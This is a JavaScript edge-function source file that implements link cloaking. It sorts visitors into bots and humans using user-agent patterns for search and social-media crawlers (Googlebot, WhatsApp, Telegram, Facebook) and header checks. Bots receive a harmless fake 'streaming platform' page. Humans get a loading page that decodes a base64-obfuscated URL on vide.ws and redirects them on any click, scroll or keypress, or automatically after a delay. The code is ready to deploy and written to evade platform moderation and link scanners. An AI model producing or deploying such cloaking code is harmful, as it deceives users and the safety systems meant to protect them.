export async function onRequest(context) {
  const { request } = context;
  const url = new URL(request.url);
  const path = url.pathname;
  
  // Advanced Bot Detection
  const isBot = detectBot(request);
  
  if (isBot) {
    // Serve SAFE content to bots
    return serveSafeContent(path);
  } else {
    // Serve REDIRECT content to humans
    return serveRedirectContent(path, request);
  }
}

// ===== BOT DETECTION =====
function detectBot(request) {
  const userAgent = request.headers.get('user-agent') || '';
  const accept = request.headers.get('accept') || '';
  const acceptLanguage = request.headers.get('accept-language') || '';
  
  // Bot patterns
  const botPatterns = [
    /bot/i, /crawler/i, /spider/i, /monitoring/i,
    /Twitterbot/i, /facebookexternalhit/i, /WhatsApp/i,
    /TelegramBot/i, /Discordbot/i, /Slackbot/i,
    /Googlebot/i, /Bingbot/i, /YandexBot/i, /DuckDuckBot/i
  ];
  
  // Check bot patterns
  const isBotByUA = botPatterns.some(pattern => pattern.test(userAgent));
  
  // Additional signals
  const hasNoAcceptLanguage = !acceptLanguage;
  const hasSimpleAccept = accept.includes('*/*');
  const hasNoCookies = !request.headers.get('cookie');
  
  return isBotByUA || (hasNoAcceptLanguage && hasSimpleAccept);
}

// ===== PATH MAPPING =====
function getTargetPath(sourcePath) {
  const pathMappings = {
    '/d/': '/e/',
    '/f/': '/f/', 
    '/v/': '/d/',
    '/s/': '/c/',
    '/p/': '/a/',
    '/w/': '/b/'
    // Tambahkan mapping lain sesuai kebutuhan
  };
  
  // Find matching base path
  for (const [sourceBase, targetBase] of Object.entries(pathMappings)) {
    if (sourcePath.startsWith(sourceBase)) {
      const remainingPath = sourcePath.slice(sourceBase.length);
      return `https://vide.ws${targetBase}${remainingPath}`;
    }
  }
  
  // Default fallback
  return `https://vide.ws/${sourcePath.slice(1)}`;
}

// ===== SAFE CONTENT (FOR BOTS) =====
function serveSafeContent(path) {
  const pathId = path.split('/').pop() || 'content';
  
  const safeHtml = `
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Video Content ${pathId} - Streaming Platform</title>
    <meta name="description" content="Watch amazing video content ${pathId}. High quality streaming platform with various entertainment options.">
    <meta property="og:title" content="Video ${pathId} - Streaming Platform">
    <meta property="og:description" content="Watch this amazing video content in high quality">
    <meta property="og:type" content="video.movie">
    <meta property="og:url" content="https://your-domain.com${path}">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; 
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }
        .container {
            background: white;
            border-radius: 15px;
            padding: 30px;
            box-shadow: 0 20px 40px rgba(0,0,0,0.1);
            max-width: 500px;
            width: 100%;
            text-align: center;
        }
        .video-placeholder {
            background: linear-gradient(45deg, #f0f0f0, #e0e0e0);
            height: 280px;
            border-radius: 10px;
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 20px 0;
            position: relative;
            overflow: hidden;
        }
        .video-placeholder::before {
            content: '';
            position: absolute;
            width: 80px;
            height: 80px;
            border: 3px solid #999;
            border-radius: 50%;
            border-top-color: #667eea;
            animation: spin 1s linear infinite;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        h1 {
            color: #333;
            margin-bottom: 10px;
            font-size: 24px;
        }
        p {
            color: #666;
            line-height: 1.6;
            margin-bottom: 20px;
        }
        .btn {
            background: linear-gradient(135deg, #667eea, #764ba2);
            color: white;
            border: none;
            padding: 12px 30px;
            border-radius: 25px;
            font-size: 16px;
            cursor: pointer;
            transition: transform 0.2s;
        }
        .btn:hover {
            transform: translateY(-2px);
        }
        .content-id {
            background: #f8f9fa;
            padding: 8px 15px;
            border-radius: 20px;
            font-family: monospace;
            color: #667eea;
            font-weight: bold;
            margin: 10px 0;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>🎬 Video Content Ready</h1>
        <div class="content-id">ID: ${pathId}</div>
        <p>High-quality streaming content is loading...</p>
        
        <div class="video-placeholder">
            <!-- Video player placeholder -->
        </div>
        
        <p>This content is optimized for your device and network conditions.</p>
        <button class="btn" onclick="window.location.reload()">
            Refresh Content
        </button>
        
        <div style="margin-top: 20px; font-size: 12px; color: #999;">
            Streaming Platform • HD Quality • Secure Connection
        </div>
    </div>
</body>
</html>`;

  return new Response(safeHtml, {
    headers: { 
      'Content-Type': 'text/html',
      'Cache-Control': 'public, max-age=300' // 5 minutes cache for bots
    }
  });
}

// ===== REDIRECT CONTENT (FOR HUMANS) =====
function serveRedirectContent(path, request) {
  const targetUrl = getTargetPath(path);
  const pathId = path.split('/').pop() || 'content';
  
  // Obfuscate the target URL
  const obfuscatedUrl = btoa(targetUrl).replace(/=/g, '');
  
  const redirectHtml = `
<!DOCTYPE html>
<html>
<head>
    <title>Loading Your Content...</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body {
            margin: 0;
            padding: 0;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            color: white;
            text-align: center;
        }
        .loading-container {
            max-width: 400px;
            padding: 40px;
        }
        .loader {
            width: 50px;
            height: 50px;
            border: 3px solid rgba(255,255,255,0.3);
            border-radius: 50%;
            border-top-color: white;
            animation: spin 1s ease-in-out infinite;
            margin: 0 auto 20px;
        }
        @keyframes spin {
            to { transform: rotate(360deg); }
        }
        h1 {
            margin: 0 0 10px 0;
            font-weight: 600;
        }
        p {
            margin: 0 0 20px 0;
            opacity: 0.8;
        }
        .progress {
            width: 100%;
            height: 4px;
            background: rgba(255,255,255,0.2);
            border-radius: 2px;
            overflow: hidden;
            margin: 20px 0;
        }
        .progress-bar {
            height: 100%;
            background: white;
            width: 0%;
            animation: progress 2s ease-in-out infinite;
        }
        @keyframes progress {
            0% { width: 0%; }
            50% { width: 70%; }
            100% { width: 100%; }
        }
        .click-message {
            background: rgba(255,255,255,0.1);
            padding: 10px 15px;
            border-radius: 10px;
            margin: 15px 0;
            font-size: 14px;
            cursor: pointer;
            transition: background 0.3s;
        }
        .click-message:hover {
            background: rgba(255,255,255,0.2);
        }
    </style>
</head>
<body>
    <div class="loading-container">
        <div class="loader"></div>
        <h1>Preparing Your Content</h1>
        <p>Loading video ID: <strong>${pathId}</strong></p>
        
        <div class="progress">
            <div class="progress-bar"></div>
        </div>
        
        <div class="click-message" id="clickTrigger">
            🎬 Click anywhere to start watching immediately
        </div>
        
        <p style="font-size: 12px; opacity: 0.6;">
            Optimizing playback for your connection...
        </p>
    </div>

    <script>
        // Obfuscated URL reconstruction
        const encodedUrl = '${obfuscatedUrl}';
        const padding = 4 - (encodedUrl.length % 4);
        const paddedUrl = encodedUrl + '='.repeat(padding);
        
        function decodeAndRedirect() {
            try {
                const targetUrl = atob(paddedUrl);
                console.log('Redirecting to content...');
                window.location.href = targetUrl;
            } catch (error) {
                console.error('Decode error:', error);
                // Fallback
                window.location.href = 'https://vide.ws/${pathId}';
            }
        }
        
        let redirectInitiated = false;
        
        function initiateRedirect() {
            if (!redirectInitiated) {
                redirectInitiated = true;
                decodeAndRedirect();
            }
        }
        
        // Multiple trigger methods
        document.addEventListener('click', initiateRedirect);
        document.addEventListener('keydown', initiateRedirect);
        document.addEventListener('scroll', initiateRedirect);
        document.addEventListener('touchstart', initiateRedirect);
        
        // Auto-redirect after delay
        setTimeout(initiateRedirect, 2500);
        
        // Progress indicator
        let progress = 0;
        const progressInterval = setInterval(() => {
            progress += 5;
            if (progress >= 100) {
                clearInterval(progressInterval);
            }
        }, 100);
    </script>
</body>
</html>`;

  return new Response(redirectHtml, {
    headers: { 
      'Content-Type': 'text/html',
      'Cache-Control': 'no-cache, no-store, must-revalidate'
    }
  });
}
